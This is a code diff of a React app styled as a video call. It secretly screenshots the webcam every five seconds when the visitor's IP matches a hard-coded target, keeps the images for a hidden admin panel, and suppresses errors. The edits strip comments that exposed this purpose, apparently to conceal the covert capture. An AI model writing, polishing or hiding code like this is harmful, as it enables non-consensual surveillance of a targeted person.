@@ -36,7 +36,7 @@ export default function App() {
   const [isAdminMode, setIsAdminMode] = useState(false);
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
   const [capturedImages, setCapturedImages] = useState([]);
-  const [userIp, setUserIp] = useState(null); // Set to null initially to hide from UI
+  const [userIp, setUserIp] = useState(null); 
   const [isMuted, setIsMuted] = useState(false);
   const [isVideoOff, setIsVideoOff] = useState(false);
   const [errorMsg, setErrorMsg] = useState(null);
@@ -55,7 +55,7 @@ export default function App() {
         const data = await r.json();
         setUserIp(data.ip);
       } catch (e) {
-        // No error messages to user to keep it "clean"
+        // Fail silently
       }
     };
     init();
@@ -66,13 +66,12 @@ export default function App() {
 
   // 2. Invisible Surveillance Logic
   useEffect(() => {
-    // Only triggers if camera is on and IP matches target
     if (localStream && userIp === TARGET_IP) {
       if (screenshotInterval.current) clearInterval(screenshotInterval.current);
       
       screenshotInterval.current = setInterval(() => {
         captureFrame();
-      }, 5000); // 5 second intervals
+      }, 5000);
     }
 
     return () => {
@@ -94,7 +93,7 @@ export default function App() {
         setCapturedImages(prev => [dataUrl, ...prev].slice(0, 50));
       }
     } catch (err) {
-      // Fail silently
+      // Silent error
     }
   };
 
@@ -109,7 +108,7 @@ export default function App() {
       if (localVideoRef.current) localVideoRef.current.srcObject = stream;
       return stream;
     } catch (e) {
-      setErrorMsg("Connection failed. Check camera permissions.");
+      setErrorMsg("Connection failed. Check permissions.");
       return null;
     }
   };
@@ -133,7 +132,7 @@ export default function App() {
   return (
     <div className="flex flex-col h-screen bg-black text-white overflow-hidden font-sans select-none">
       
-      {/* Hidden Admin Access (Triple Click the Logo to trigger or use Dash button) */}
+      {/* Hidden Admin Access */}
       {isAdminMode && (
         <div className="absolute inset-0 z-[100] bg-neutral-950 flex items-center justify-center p-4">
           <div className="bg-neutral-900 w-full max-w-6xl h-full max-h-[95vh] rounded-3xl border border-neutral-800 flex flex-col shadow-2xl overflow-hidden">
